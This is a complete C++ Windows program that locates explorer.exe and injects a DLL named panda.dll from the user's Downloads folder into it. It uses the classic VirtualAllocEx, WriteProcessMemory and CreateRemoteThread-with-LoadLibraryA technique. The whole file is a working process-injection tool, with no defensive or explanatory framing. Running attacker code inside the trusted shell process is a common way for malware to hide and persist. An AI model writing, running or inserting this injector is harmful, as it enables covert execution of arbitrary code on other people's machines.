#include <windows.h> 
#include <iostream>
#include <tlhelp32.h>
#include <ShlObj.h>

bool InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write to target process memory. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        std::cerr << "Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully." << std::endl;
    return true;
}

DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;  // Use the Unicode version of PROCESSENTRY32
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Take a snapshot of all processes in the system
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateToolhelp32Snapshot failed (" << GetLastError() << ").\n";
        return 0;
    }

    // Retrieve information about the first process
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Compare the process name
            if (processName == pe32.szExeFile) {
                processID = pe32.th32ProcessID;  // Found the process ID
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));  // Continue with the next process
    }
    else {
        std::wcerr << L"Process32First failed (" << GetLastError() << ").\n";
    }

    CloseHandle(hSnapshot);  // Clean up the snapshot object
    return processID;
}

std::string GetDownloadsFolderPath() {
    PWSTR downloadsPath = NULL;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath);
    if (SUCCEEDED(hr)) {
        std::wstring ws(downloadsPath);
        std::string downloadsFolder(ws.begin(), ws.end());
        CoTaskMemFree(downloadsPath);
        return downloadsFolder;
    }
    else {
        std::cerr << "Failed to get Downloads folder path. Error: " << hr << std::endl;
        return "";
    }
}

int main() {
    std::wstring processName = L"explorer.exe";  // Name of the process to search for
    DWORD pid = GetProcessIDByName(processName);

    std::string downloadsFolderPath = GetDownloadsFolderPath();
    if (downloadsFolderPath.empty()) {
        std::cerr << "Could not retrieve the Downloads folder path." << std::endl;
        return 1;
    }

    std::string dllPath = downloadsFolderPath + "\\panda.dll";

    if (InjectDLL(pid, dllPath.c_str())) {
        std::cout << "Injection successful!" << std::endl;
    }
    else {
        std::cout << "Injection failed." << std::endl;
    }

    return 0;
}
